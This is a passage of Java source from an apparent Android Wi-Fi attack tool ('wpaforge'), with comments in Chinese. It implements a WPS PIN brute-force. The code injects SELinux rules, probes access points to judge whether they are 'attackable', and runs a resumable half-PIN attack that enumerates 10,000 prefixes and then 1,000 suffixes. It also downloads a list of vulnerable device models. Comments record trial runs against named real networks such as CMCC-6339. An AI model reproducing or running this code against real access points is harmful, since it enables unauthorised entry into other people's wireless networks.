        halfDlg.setNegative(L.s("取消", "Cancel"), null);
        halfDlg.show();
    }

    private void stopWps() {
        if (!wpsTaskMgr().isActive()) {
            Toast.makeText(this, L.s("没有正在运行的任务", "No running task"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        if (!wpsTaskMgr().requestStop()) return;    // 已在停止中：重复点击直接忽略
        wpsCancel = true;                     // 唯一停止信号：执行线程每步都查它
        wpsLog(L.s("[停止] 请求已发出（状态 → STOPPING）；完成当前这一轮后收工，进度已存档。",
                "[stop] requested (state -> STOPPING); finishing current try, progress saved."));
        refreshWpsButtons();                  // 立即反馈「停止中…」
        refreshWpsProgress();
    }

    private void runWpsAttack(String bssid) {
        wpsFailReason = null;
        try {
            wpsLog(L.s("[i] 注入权限规则…", "[i] injecting rules…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.injectSelinux(this);
            wpsLog(L.s("[i] 暂停自动重连…", "[i] pausing auto-join…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, false);
            wpsAutojoinMarkLimited();

            // 先把「这个 AP 收不收 PIN」问清楚。AP 自己宣告的 WSC 配置方法
            // 就能决定 PIN 攻击有没有意义，不该靠盲跑 8×20 秒去试。
            wpsLog(L.s("[i] 读取 AP 的 WPS 能力…", "[i] reading AP WPS capability…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.Info wi =
                    io.github.wlmosv_png.wpaforge.wps.WpsController.info(this, bssid);
            io.github.wlmosv_png.wpaforge.wps.WpsEngine.precheck(wpsSession, wi);
            // 2026-11-09 架构升级：双通道能力检测（通道 A=root BSS；通道 B=本地 IE 解析）
            io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Channel chA =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.root(
                            bssid, wi.mask, -1, -1, wi.locked ? 1 : 0, wi.device, "", 
                            System.currentTimeMillis());
            io.github.wlmosv_png.wpaforge.wps.WpsIeParser.Result ie =
                    io.github.wlmosv_png.wpaforge.wps.WpsIeParser.parseIeHex(wi.ieHex);
            io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Channel chB =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.localIe(
                            bssid, ie, wi.ieHex, System.currentTimeMillis());
            io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Capability cap =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager
                            .combine(bssid, System.currentTimeMillis(), chA, chB);
            final io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Capability fcap = cap;
            wpsCapByBssid.put(bssid, cap);          // 唯一来源：写入缓存，标签/门面都读它
            runOnUiThread(() -> {
                wpsLastCapVerdict = fcap.verdict;
                setWpsCapTag(wpsUiStateOf(fcap.verdict));
            });
            wpsLog(L.s("[能力] 双通道合并 → " + cap.verdict + "（" + cap.primarySource + "）：" + cap.reason,
                    "[cap] dual-channel -> " + cap.verdict + " (" + cap.primarySource + "): " + cap.reason));
            if (!cap.issues.isEmpty()) {
                wpsLog("[cap] issues: " + cap.issueSummary());
            }
            boolean zhCap = L.s("a", "b").equals("a");
            // 通道 A 的**原始读取结果**（不再冒充最终结论；最终结论在下面的双通道合并）
            wpsLog(L.s("[能力] 通道A(root) read=" + (wi.readOk ? "OK" : "FAILED")
                            + "  raw_verdict=" + wi.verdict,
                    "[cap] channelA(root) read=" + (wi.readOk ? "OK" : "FAILED")
                            + "  raw_verdict=" + wi.verdict)
                    + (wi.methods.isEmpty() ? "" : "  config_methods=" + wi.methods)
                    + (wi.locked ? "  locked=1" : "")
                    + (wi.device.isEmpty() ? "" : "  device=" + wi.device));
            if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.presetTerminal(wpsSession)) {
                // 走到这里说明用户已经二次确认过：尊重选择，退回运行时兜底
                wpsLog(L.s("[!] 该目标已被判打不动，按你的要求强制运行（只留运行时判定）。",
                        "[!] Target judged hopeless - forcing as requested (runtime verdict only)."));
                wpsSession.forced = true;
                wpsSession.verdict = io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_RUNNING;
            }

            wpsLog(L.s("[阶段] 开始执行策略：" + wpsModeLabel(wpsMode),
                    "[phase] start strategy: " + wpsModeLabel(wpsMode)));
            long attackT0 = System.currentTimeMillis();
            if (wpsMode == 3) {
                runHalfAttack(bssid);
            } else if (wpsMode <= 2) {
                java.util.List<String> pins = wpsCandidatePins(bssid);
                if (pins.isEmpty()) {
                    wpsLog(L.s("[!] 候选为空 —— 厂商算法对这个 BSSID 没算出结果，"
                                    + "而「我的列表」也还没导入。换个策略或先导入候选。",
                            "[!] No candidates: vendor algorithms produced nothing for this BSSID "
                                    + "and no imported list. Switch strategy or import candidates."));
                } else {
                    wpsLog(L.s("[i] 策略「", "[i] strategy \"") + wpsStrategyName()
                            + L.s("」，候选 ", "\", candidates ") + pins.size() + L.s(" 个", ""));
                    // 分小批跑：每批结束就过一次判定（判死立刻收工，不跑完剩余）
                    for (int i = 0; i < pins.size() && !wpsCancel; i += WPS_WEAK_CHUNK) {
                        if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.shouldStop(wpsSession)) break;
                        int end = Math.min(pins.size(), i + WPS_WEAK_CHUNK);
                        runWpsBatch(pins.subList(i, end));
                    }
                }
            }
            // 完整枚举已移除：wpsMode 现在只会是 0..3（拆半或弱 PIN/厂商/导入）。
            if (wpsMode >= 4) {
                wpsLog(L.s("[!] 完整枚举已移除，已回退到拆半模式。",
                        "[!] full enumeration removed; fell back to half-PIN."));
                wpsMode = 3;
            }
        } catch (Throwable t) {
            wpsLog("[err] " + t);
            wpsFailReason = String.valueOf(t);
        } finally {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, true);
                wpsAutojoinClearLimited();
                wpsLog(L.s("[i] 已恢复自动重连", "[i] auto-join restored"));
            } catch (Throwable ignored) {
            }
            // 结构化：任务收尾 —— 耗时 / 最终状态 / 证据等级 / 停止完成
            wpsLog(L.s("[停止] 执行线程已退出，任务收尾", "[stop] worker exited, finalizing"));
            // 2026-11-09（P0-3）：线程退出必须落到明确的终态 ——
            // 用户停止 → STOPPED（**不是失败、不是 PIN 错**）；异常 → FAILED；其余 → COMPLETED
            int wpsTerminal = wpsFailReason != null
                    ? io.github.wlmosv_png.wpaforge.wps.WpsRunState.FAILED
                    : (wpsCancel ? io.github.wlmosv_png.wpaforge.wps.WpsRunState.STOPPED
                                 : io.github.wlmosv_png.wpaforge.wps.WpsRunState.COMPLETED);
            wpsTaskMgr().workerExited(wpsTerminal);
            // 台账收尾：区分命中 / 用户暂停 / 异常 / 候选跑完（终止原因必须落账）
            if (wpsFailReason != null) {
                wpsTaskFinish(io.github.wlmosv_png.wpaforge.wps.WpsLedger.ST_FAILED,
                        L.s("异常终止：" + wpsFailReason, "failed: " + wpsFailReason));
            } else if (wpsSession != null && io.github.wlmosv_png.wpaforge.wps.WpsEngine
                    .V_HIT.equals(wpsSession.verdict)) {
                wpsTaskFinish(io.github.wlmosv_png.wpaforge.wps.WpsLedger.ST_DONE,
                        L.s("命中，已收工", "hit - stopped"));
            } else if (wpsCancel) {
                wpsTaskFinish(io.github.wlmosv_png.wpaforge.wps.WpsLedger.ST_PAUSED,
                        L.s("用户暂停（进度已存档）", "paused by user"));
            } else {
                wpsTaskFinish(io.github.wlmosv_png.wpaforge.wps.WpsLedger.ST_DONE,
                        L.s("候选跑完", "candidates exhausted"));
            }
            // 2026-11-09（P0-3）：最终日志**同时**输出三个正交维度 ——
            //   执行状态（任务层面：STOPPED/COMPLETED/FAILED）
            //   判定结果（目标层面：HIT/RUNNING/NO_PIN/…）
            //   证据等级（可信度：已确认/待验证/未确认）
            String execLabel = wpsTaskMgr().state().label();
            if (wpsSession != null) {
                String lvl = io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.levelField(wpsSession);
                wpsLog(L.s("[结果] 执行状态=" + execLabel
                                + " | 判定=" + wpsSession.verdict
                                + " | 证据等级=" + io.github.wlmosv_png.wpaforge.wps.WpsHitJudge
                                        .levelText(lvl, zhUi())
                                + ("STOPPED".equals(execLabel) ? "（用户停止，非失败）" : ""),
                        "[result] exec=" + execLabel
                                + " | verdict=" + wpsSession.verdict
                                + " | level=" + io.github.wlmosv_png.wpaforge.wps.WpsHitJudge
                                        .levelText(lvl, false)
                                + ("STOPPED".equals(execLabel) ? " (user-stopped, not failure)" : "")));
            } else {
                wpsLog(L.s("[结果] 执行状态=" + execLabel + " | 判定=（无会话）",
                        "[result] exec=" + execLabel + " | verdict=(no session)"));
            }
            runOnUiThread(() -> {
                refreshWpsButtons();
                renderWpsTargets();
                renderWpsModeList();
                refreshWpsProgress();
            });
        }
    }

    /**
     * 拆半攻击主循环。
     *
     * 阶段 1：后 3 位固定 000，穷举前 4 位（10000 次）
     * 阶段 2：前 4 位已确认，穷举后 3 位（1000 次，第 8 位是校验位）
     * 合计 11000 次必然覆盖真 PIN。
     *
     * 判据来自 supplicant 日志：正常错 PIN 时 M2D 之后一路静默到超时；
     * 一旦前 4 位被接受，AP 会回 M3，日志立刻不一样。
     */
    /**
     * 手动添加目标 BSSID。
     *
     * 为什么需要：同一个 SSID 下可能有多个 BSSID，行为完全不同（实测 CMCC-6339 的
     * ...2b 关联 5.8 秒可打，...2c 完全无响应）。而弱信号那个常常一轮扫不到，
     * 结果体检名单里出现的是同名的另一个不可打接口 —— 越测越没结果。
     */
    private void showAddTargetDialog() {
        final EditText in = new EditText(this);
        in.setInputType(android.text.InputType.TYPE_CLASS_TEXT);
        in.setHint(L.s("AA:BB:CC:DD:EE:FF", "AA:BB:CC:DD:EE:FF"));
        io.github.wlmosv_png.wpaforge.ui.NetDialog addDlg = new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                L.s("手动添加目标 BSSID", "Add target BSSID"),
                L.s("同名 SSID 可能有多个 BSSID，行为完全不同；"
                        + "弱信号那个常常扫不到，用这个直接指定。",
                        "Same SSID may map to several BSSIDs with different behaviour."));
        addDlg.addView(in);
        addDlg.setPositive(L.s("添加并查能力", "Add & probe"), nd -> {
                    final String b = in.getText().toString().trim().toLowerCase();
                    if (!b.matches("[0-9a-f]{2}(:[0-9a-f]{2}){5}")) {
                        Toast.makeText(this, L.s("格式不对，要 AA:BB:CC:DD:EE:FF",
                                "Bad format, need AA:BB:CC:DD:EE:FF"), Toast.LENGTH_SHORT).show();
                        return;
                    }
                    new Thread(() -> {
                        io.github.wlmosv_png.wpaforge.wps.WpsController.Info info =
                                io.github.wlmosv_png.wpaforge.wps.WpsController.info(this, b);
                        runOnUiThread(() -> {
                            io.github.wlmosv_png.wpaforge.wps.WpsController.Target t =
                                    new io.github.wlmosv_png.wpaforge.wps.WpsController.Target();
                            t.bssid = b;
                            t.ssid = info.ssid.isEmpty() ? "(手动)" : info.ssid;
                            t.wpsVerdict = info.verdict;
                            t.wpsMethods = info.methods;
                            t.wpsDevice = info.device;
                            t.pairingWindow = info.pairingWindow;
                            t.devPwdId = info.devPwdId;
                            loadVulnList();
                            t.vuln = io.github.wlmosv_png.wpaforge.wps.VulnWsc.match(info.device, vulnEntries);
                            boolean dup = false;
                            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target x : wpsTargetMgr.targets()) {
                                if (x.bssid.equalsIgnoreCase(b)) dup = true;
                            }
                            if (!dup) wpsTargetMgr.targets().add(0, t);
                            wpsTargetMgr.select(t);
                            wpsWarnedBssid = null;
                            refreshWpsPickedMeta();
                            renderWpsTargets();
                            Toast.makeText(this, L.s("已添加：" + t.capLabel(true),
                                    "Added: " + t.capLabel(false)), Toast.LENGTH_LONG).show();
                        });
                    }, "wps-add-target").start();
        });
        addDlg.setNegative(L.s("取消", "Cancel"), null);
        addDlg.show();
    }

    // ---------------- 已知可打（Pixie）名单 ----------------

    /** 界面语言：与全站一致的单点判断。 */
    private static boolean zhUi() {
        return L.s("a", "b").equals("a");
    }

    /** 读名单（VulnWscStore 自带进程内缓存；读不到就是空表，不抛）。 */
    private void loadVulnList() {
        vulnListExists = io.github.wlmosv_png.wpaforge.wps.VulnWscStore.exists(this);
        vulnEntries = io.github.wlmosv_png.wpaforge.wps.VulnWscStore.load(this);
    }

    /** 用当前名单重算所有目标的标记。设备名为空的不判 —— 读不到就不标。 */
    private void matchAllTargets() {
        for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target t : wpsTargetMgr.targets()) {
            t.vuln = t.wpsDevice.isEmpty() ? null
                    : io.github.wlmosv_png.wpaforge.wps.VulnWsc.match(t.wpsDevice, vulnEntries);
        }
    }

    /** 名单按钮文案 + 诊断行。数字全部来自实测：名单条数、目标数、读到设备名的个数、命中个数。 */
    private void refreshVulnUi() {
        if (vulnEntries == null && !vulnBusy) loadVulnList();
        int entries = vulnEntries == null ? 0 : vulnEntries.size();
        if (wpsVulnBtn != null) {
            wpsVulnBtn.setText(io.github.wlmosv_png.wpaforge.wps.VulnUi
                    .listButton(vulnListExists, entries, vulnBusy, zhUi()));
            wpsVulnBtn.setEnabled(!vulnBusy);
        }
        if (wpsVulnDiag == null) return;
        int named = 0, hits = 0;
        for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target t : wpsTargetMgr.targets()) {
            if (!t.wpsDevice.isEmpty()) named++;
            if (t.vuln != null) hits++;
        }
        io.github.wlmosv_png.wpaforge.wps.VulnUi.Diag d = io.github.wlmosv_png.wpaforge.wps.VulnUi.diagnose(
                vulnListExists, entries, wpsTargetMgr.targets().size(), named, hits,
                wpsCtrlOk == 1, zhUi());
        wpsVulnDiag.setText(d.text);
        wpsVulnDiag.setTextColor(d.action ? DANGER : AmberTheme.TEXT_DIM);
    }

    /** 下载/更新名单。阻塞式网络调用放子线程，回来再刷界面。 */
    private void downloadVulnList() {
        if (vulnBusy) return;
        vulnBusy = true;
        refreshVulnUi();
        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.wps.VulnWscStore.Result r = io.github.wlmosv_png.wpaforge.wps.VulnWscStore.update(this);
            runOnUiThread(() -> {
                vulnBusy = false;
                loadVulnList();
                matchAllTargets();
                refreshVulnUi();
                renderWpsTargets();
                Toast.makeText(this, r.ok
                        ? L.s("名单已更新：" + r.entries + " 条",
                              "List updated: " + r.entries + " entries")
                        : L.s("名单下载失败：" + r.message,
                              "List download failed: " + r.message),
                        Toast.LENGTH_LONG).show();
            });
        }, "vuln-list").start();
    }

    /** 体检范围按钮的文案。 */
    private void refreshReconScope() {
        if (wpsReconAllBtn == null) return;
        wpsReconAllBtn.setText(wpsReconAll
                ? L.s("体检范围：全部目标（含「不收外部 PIN」的）",
                      "Recon scope: ALL targets")
                : L.s("体检范围：跳过「不收外部 PIN」的（实测那批打不动）",
                      "Recon scope: skip NO-PIN targets"));
    }

    private static final int WPS_RECON_TRY_SEC = 20;
    /**
     * 体检每个目标采样几次。
     * 实测：同一个 AP 三次测量能给出 11.8s / 0ms / 5.3s 三种结果 ——
     * AP 的 WPS 响应是间歇的，单次测量根本定不了性，必须多采几次取最好。
     */
    private static final int WPS_RECON_TRIES = 3;

    /**
     * 目标体检：对每个 WPS AP 各发一次探测 PIN，判断它到底会不会跟我们做 WPS。
     *
     * 这是「不盲跑」的核心：开 WPS ≠ 接受外部 PIN。只有关联能维持 1.5 秒以上
     * （说明真的在跑 EAP-WSC 交换）的目标才值得投入几十小时。
     */
    private void doWpsRecon() {
        if (wpsTaskMgr().isRunning()) {
            Toast.makeText(this, L.s("任务运行中，请先暂停", "Task running - pause first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        if (wpsTargetMgr.targets().isEmpty()) {
            Toast.makeText(this, L.s("请先扫描目标", "Scan targets first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        wpsTaskMgr().beginRun();
        wpsCancel = false;
        wpsLogMgr.clear();
        refreshWpsButtons();
        renderWpsTargets();
        renderWpsModeList();
        new Thread(this::runWpsRecon, "wps-recon").start();
    }

    private void runWpsRecon() {
        try {
            wpsLog(L.s("[i] 目标体检开始：每个 AP 发 " + WPS_RECON_TRIES
                            + " 次 00000000，取最好的一次（AP 的 WPS 响应是间歇的）。",
                    "[i] Recon started: " + WPS_RECON_TRIES + " probe PINs per AP, best of."));
            wpsLog(L.s("[i] 判据：关联 ≥1.5 秒 = 真的在做 WPS（可打）；几百毫秒 = 关联即断。",
                    "[i] Rule: assoc >= 1.5s means real WPS exchange."));
            io.github.wlmosv_png.wpaforge.wps.WpsController.injectSelinux(this);
            io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, false);
            /*
             * 默认跳过 wps_config_methods 不含 KEYPAD/LABEL 的目标。
             *
             * 依据是实测（2026-10-22，每台 3 次采样）：
             *   B227 / B209 / B212（全是 0x2008）→ 0/0/0、202~247ms ×3，全部打不动。
             * 注意它只是「必要不充分」：含 KEYPAD 也不保证能打
             *   （WIFI-8F65 是 0x0380，照样只有 201ms）。
             * 所以我不会拿它反过来证明「能打」—— 能不能打只看体检的实测结果。
             * 想连跳过的也测，点「体检范围」按钮切到全测。
             */
            java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> list =
                    new java.util.ArrayList<>();
            int skipped = 0;
            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : wpsTargetMgr.targets()) {
                if (!wpsReconAll
                        && ("NO_PIN".equals(tg.wpsVerdict) || "LOCKED".equals(tg.wpsVerdict))) {
                    tg.recon = "SKIP";
                    tg.reconDetail = "NO_PIN".equals(tg.wpsVerdict)
                            ? ("config_methods=" + tg.wpsMethods)
                            : L.s("beacon 报 AP Setup Locked", "locked");
                    skipped++;
                    continue;
                }
                list.add(tg);
            }
            // config_methods 不可靠，但可以作为「先测谁」的排序参考：PIN_OK 优先，再按信号
            java.util.Collections.sort(list, (a, b) -> {
                boolean pa = "PIN_OK".equals(a.wpsVerdict);
                boolean pb = "PIN_OK".equals(b.wpsVerdict);
                if (pa != pb) return pa ? -1 : 1;
                return b.rssi - a.rssi;
            });
            wpsLog(L.s("[i] 跳过 " + skipped + " 个目标（声明不收外部 PIN / 已锁定），"
                            + "剩下 " + list.size() + " 个待测。",
                    "[i] Skipped " + skipped + "; testing " + list.size() + "."));
            if (!wpsReconAll) {
                wpsLog(L.s("[i] 跳过依据是实测的：0x2008（显示型）的 3 台 × 3 次采样全部打不动。"
                                + "想连它们一起测就点上面的范围按钮。",
                        "[i] Skip is evidence-based: all 0x2008 targets failed 3/3 samples."));
            }
            int ready = 0;
            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : list) {
                if (wpsCancel) break;
                wpsLog("");
                wpsLog("=== " + tg.ssid + "   " + tg.bssid);
                // 多采几次取最好 —— AP 的 WPS 响应是间歇的，单次会骗人
                io.github.wlmosv_png.wpaforge.wps.WpsController.Result best = null;
                StringBuilder tries = new StringBuilder();
                for (int k = 0; k < WPS_RECON_TRIES && !wpsCancel; k++) {
                    String recSsid = tg.ssid == null || tg.ssid.startsWith("(") ? "" : tg.ssid;
                    io.github.wlmosv_png.wpaforge.wps.WpsController.Result r =
                            io.github.wlmosv_png.wpaforge.wps.WpsController.tryPin(
                                    this, tg.bssid, recSsid, "00000000", WPS_RECON_TRY_SEC);
                    if (tries.length() > 0) tries.append(" / ");
                    tries.append(r.maxAssocMs).append("ms");
                    if (best == null || r.maxAssocMs > best.maxAssocMs) best = r;
                    if (r.isSuccess()) break;
                    if (r.halfPrefixAccepted()) best = r;
                }
                if (best == null) continue;
                tg.recon = classifyRecon(best);
                tg.reconDetail = best.maxAssocMs + "ms " + best.logKind
                        + L.s("  (采样 ", "  (samples ") + tries + ")";
                if (tg.reconReady()) ready++;
                wpsLog("    " + tg.reconLabel(true) + "   最好关联 " + best.maxAssocMs + "ms"
                        + "   日志 " + best.logKind
                        + L.s("   采样: ", "   samples: ") + tries
                        + (best.apLocked == 1 ? "   [AP 已锁定]" : ""));
                if (best.halfPrefixAccepted()) {
                    wpsLog(L.s("    ★ 探测命中判据 —— 目标极可能可破。",
                            "    * Probe tripped the criterion."));
                }
                runOnUiThread(this::renderWpsTargets);
            }
            wpsLog("");
            wpsLog(L.s("[i] 体检结束：" + ready + " / " + list.size()
                            + " 个目标真的在做 WPS，其余不值得投入。",
                    "[i] Recon done: " + ready + " / " + list.size() + " are really doing WPS."));
        } catch (Throwable t) {
            wpsLog("[err] " + t);
        } finally {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, true);
            } catch (Throwable ignored) {
            }
            wpsTaskMgr().workerExited();
            runOnUiThread(() -> {
                refreshWpsButtons();
                renderWpsTargets();
                renderWpsModeList();
            });
        }
    }

    /** 体检结论分类。 */
    /**
     * 体检结论分类。
     *
     * 判「可打」用的是双条件：**出现过 WPS 会话（km=WPS）** 且 **关联维持 ≥1.5 秒**。
     * 只看关联时长不够 —— 实测有 AP 关联能到 4.8 秒却没进 WPS 交换（那是偶发假象）。
     * 2026-10-22 五次目标 × 三次采样的实测基线：
     *   CMCC-6339  5671/5426/5367ms + M2D  → READY（抖动 <5%，唯一稳的）
     *   B227       0/0/0ms        + NONE   → 无响应
     *   B209/B212  200~247ms      + M2D    → 关联即断
     *   WIFI-8F65  201/201/201ms  + M2D    → 关联即断（注意它 methods 含 KEYPAD 也没用）
     */
    private String classifyRecon(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
        if (r.isSuccess()) return "HIT";
        if (r.apLocked == 1) return "LOCKED";
        if (r.maxAssocMs >= 1500 && r.wpsSession) return "READY";
        if (r.maxAssocMs >= 1500) return "MAYBE";
        if (r.maxAssocMs > 0) return "INSTANT";
        if (r.apIsTalking()) return "WEAK";
        return "NOWPS";
    }

    private void runHalfAttack(String bssid) {
        if (wpsSession.halfPhase == 0) {
            wpsHalfBssid = bssid;
            wpsHalfSsid = wpsTargetSsidForMatch();
            String why = loadHalfState();
            if (!why.isEmpty()) {
                // 明确告知原因，绝不静默从头开始 ——「以为在续跑、实际重跑」最误导
                wpsLog(L.s("[!] 不能续跑：" + why + " → 从阶段 1 头开始（断点保留，可回滚）。",
                        "[!] cannot resume: " + why + " -> start from phase 1"));
                wpsSession.halfPhase = 1;
                wpsSession.halfCursor = 0;
                wpsHalfCursor1 = 0;
                wpsSession.halfPrefix = "";
            }
            if (wpsSession.halfPhase == 0) wpsSession.halfPhase = 1;
            if (wpsSession.halfCursor > 0) {
                wpsLog(L.s("[i] 从断点续跑：阶段 " + wpsSession.halfPhase
                                + "，已完成 " + wpsSession.halfCursor + "/"
                                + io.github.wlmosv_png.wpaforge.wps.WpsCandidates.phaseTotal(wpsSession.halfPhase)
                                + " 个。",
                        "[i] Resuming from checkpoint: phase " + wpsSession.halfPhase
                                + " at " + wpsSession.halfCursor + "."));
            }
        }
        wpsLog(L.s("[i] 拆半攻击：阶段 1 穷举前 4 位（10000 次），阶段 2 穷举后 3 位（1000 次）。",
                "[i] Half-PIN attack: phase 1 = 10k prefixes, phase 2 = 1k suffixes."));
        while (!wpsCancel && wpsTaskMgr().isRunning()) {
            if (wpsSession.halfPhase == 2) {
                if (wpsSession.halfPrefix == null || wpsSession.halfPrefix.length() != 4) {
                    // 空前缀进阶段 2：每个候选都是 null（stage2Pin 要求 4 位前缀），
                    // 以前的表现是「静默回退到阶段 1」，而那段前缀被永久跳过 ——
                    // 拆半「前4位+后3位全覆盖」的保证就这样坏了，且没有任何提示。
                    wpsLog(L.s("[!] 阶段 2 缺少已确认的前 4 位（断点数据不完整）→ 回阶段 1 重找。",
                            "[!] phase 2 without a confirmed prefix -> back to phase 1"));
                    wpsSession.halfPhase = 1;
                    wpsSession.halfPrefix = "";
                    wpsSession.halfCursor = wpsHalfCursor1;
                    saveHalfState();
                    continue;
                }
                int start = wpsSession.halfCursor;
                java.util.List<String> pins = new java.util.ArrayList<>();
                for (int i = start; i < Math.min(1000, start + WPS_WEAK_CHUNK); i++) {
                    String p = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                            .stage2Pin(wpsSession.halfPrefix, i);
                    if (p != null) pins.add(p);
                }
                if (pins.isEmpty()) {
                    wpsLog(L.s("[x] 前 4 位 " + wpsSession.halfPrefix + " 验证失败 → 回阶段 1 继续。",
                            "[x] prefix " + wpsSession.halfPrefix + " failed -> back to phase 1."));
                    wpsSession.halfPhase = 1;
                    wpsSession.halfPrefix = "";
                    wpsSession.halfCursor = wpsHalfCursor1;
                    saveHalfState();
                    continue;
                }
                java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> rs =
                        runWpsBatch(pins);
                // 游标只按**实际处理过**的条数推进（暂停/预算/异常不得跳候选）
                io.github.wlmosv_png.wpaforge.wps.WpsBatchPlan.Out acc = io.github.wlmosv_png.wpaforge.wps.WpsBatchPlan.account(pins, rs);
                wpsSession.halfCursor = acc.nextCursor(wpsSession.halfCursor);
                if (acc.cancelled || acc.mismatched > 0) wpsLog("[i] " + acc.note);
                saveHalfState();
            } else {
                int start = wpsSession.halfCursor;
                java.util.List<String> pins = new java.util.ArrayList<>();
                for (int i = start; i < Math.min(10000, start + WPS_WEAK_CHUNK); i++) {
                    String p = io.github.wlmosv_png.wpaforge.wps.WpsCandidates.stage1Pin(i);
                    if (p != null) pins.add(p);
                }
                if (pins.isEmpty()) {
                    wpsLog(L.s("[!] 阶段 1 已试完全部 10000 个前 4 位，仍未找到。",
                            "[!] phase 1 exhausted all 10000 prefixes."));
                    break;
                }
                java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> rs =
                        runWpsBatch(pins);
                io.github.wlmosv_png.wpaforge.wps.WpsBatchPlan.Out acc = io.github.wlmosv_png.wpaforge.wps.WpsBatchPlan.account(pins, rs);
                wpsSession.halfCursor = acc.nextCursor(wpsSession.halfCursor);
                wpsHalfCursor1 = wpsSession.halfCursor;
                if (acc.cancelled || acc.mismatched > 0) wpsLog("[i] " + acc.note);
                saveHalfState();
                if (wpsSession.halfPrefixHit) {
                    wpsLog(L.s("[*] 前 4 位候选：" + wpsSession.halfPrefix + " → 进入阶段 2。",
                            "[*] prefix candidate " + wpsSession.halfPrefix + " -> phase 2."));
                    wpsSession.halfPhase = 2;
                    wpsSession.halfCursor = 0;
                    wpsSession.halfPrefixHit = false;
                    saveHalfState();
                }
            }
            runOnUiThread(MainActivity.this::refreshWpsProgress);
            if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(wpsSession.verdict)) break;
        }
    }

    /**
     * 主按钮三态：开始 / 暂停 / 继续。
     * 有断点（且是同一个目标、且不是从头）时显示「继续」，避免用户以为要重跑一遍。
     */
    private void refreshWpsButtons() {
        if (wpsStartBtn == null) return;
        if (wpsTaskMgr().isRunning()) {
            // 2026-11-09 UI 整改（P0）：运行中「停止」必须可用 —— 原来这里是
            // wpsStopBtn.setEnabled(false)，用户点「停止」根本没反应（按钮禁用），
            // 只有「开始/暂停」那个大按钮能停。现在两个入口都能停，且带停止中反馈。
            wpsStartBtn.setText(L.s("暂停", "Pause"));
            wpsStartBtn.setEnabled(true);
            wpsStopBtn.setText(wpsTaskMgr().isStopping() ? L.s("停止中…", "Stopping…")
                    : L.s("停止", "Stop"));
            wpsStopBtn.setEnabled(!wpsTaskMgr().isStopping());
            wpsStopBtn.setAlpha(wpsTaskMgr().isStopping() ? 0.5f : 1f);
        } else {
            // 「继续」只在这个按钮**真的能续跑**时才出现：断点存在，且属于当前
            // 选中的目标与当前策略。修复前只看「盘上有没有断点」，于是升级/重启后
            // 按钮写着「继续」，点下去先弹「请先扫描并选择目标」，
            // 或者按另一个策略从头跑（第二阶段审计 P0-4）。
            boolean canResume = wpsResumeReady();
            wpsStartBtn.setText(canResume ? L.s("继续", "Resume") : L.s("开始", "Start"));
            // 没有选中目标时禁用主按钮，由 resume 行说明原因（与离线校验禁用样式一致）
            boolean startAble = wpsTargetMgr.selected() != null;
            wpsStartBtn.setEnabled(startAble);
            wpsStartBtn.setAlpha(startAble ? 1f : 0.5f);
            wpsStopBtn.setText(L.s("停止", "Stop"));
            wpsStopBtn.setEnabled(false);
            wpsStopBtn.setAlpha(0.5f);
        }
        refreshWpsResumeLine();
        if (wpsModeList != null) {
            for (int i = 0; i < wpsModeList.getChildCount(); i++) {
                wpsModeList.getChildAt(i).setEnabled(!wpsTaskMgr().isRunning());
            }
        }
        if (wpsTargetList != null) {
            for (int i = 0; i < wpsTargetList.getChildCount(); i++) {
                wpsTargetList.getChildAt(i).setEnabled(!wpsTaskMgr().isRunning());
            }
        }
    }

    /** 盘上有没有任意断点（只用于「重置进度」按钮的可用性）。 */
    private boolean hasAnyWpsCheckpoint() {
        try {
            io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint.Parse p = wpsCpStore().load();
            return p.ok();
        } catch (Throwable t) {
            return false;
        }
    }

    /**
     * 当前选中的目标 + 当前策略，能不能真的续跑。
     *
     * <p>这是「继续」按钮的唯一判据 —— 与真正会执行的
     * {@link #loadHalfState()} 用同一套校验（loadFor），
     * 不允许出现「按钮说继续、实际从头跑」。
     */
    private boolean wpsResumeReady() {
        if (wpsTargetMgr.selected() == null) return false;
        if (wpsMode != 3) return false;      // 只有拆半模式有断点
        try {
            return wpsTaskMgr().loadFor(wpsTargetMgr.selected().bssid, wpsTargetSsidForMatch(), wpsMode).ok();
        } catch (Throwable t) {
            return false;
        }
    }

    /** 断点状态行：讲清「能不能继续、断点属于谁」。 */
    private void refreshWpsResumeLine() {
        if (wpsResumeLine == null) return;
        String line = wpsResumeSummary(wpsResumeReady());
        // 纯净态兜底：没有目标且没有断点时，禁用主按钮的原因也要可见
        if (line.isEmpty() && !wpsTaskMgr().isRunning() && wpsStartBtn != null && !wpsStartBtn.isEnabled()) {
            line = L.s("请先扫描并选择目标", "Scan and pick a target first");
        }
